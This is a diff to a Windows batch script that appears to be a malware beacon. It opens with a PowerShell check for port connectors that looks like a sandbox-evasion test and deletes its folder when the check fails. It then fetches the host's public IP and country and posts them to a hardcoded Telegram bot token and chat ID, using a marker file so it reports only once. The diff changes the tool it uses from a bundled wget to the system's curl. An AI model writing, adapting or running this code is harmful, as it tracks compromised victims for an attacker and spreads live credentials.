@@ -1,16 +1,16 @@
 powershell.exe -NoProfile -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\Comms') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
-if exist "%ProgramData%\ssh\sent" exit /b
+if exist "%ProgramData%\sent" exit /b
 chcp 65001 >nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
 set "CHAT_ID=-4955395962"
 set "IP=No IP"
 set "Country=No Country"
 
-for /f "tokens=1,2 delims=," %a in ('%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
+for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
     if not "%a"=="" set "Country=%a"
     if not "%b"=="" set "IP=%b"
 )
 
-%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=TRF%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
-echo done > "%ProgramData%\ssh\sent"
+%WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=TRF%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
+echo done > "%ProgramData%\sent"
 endlocal
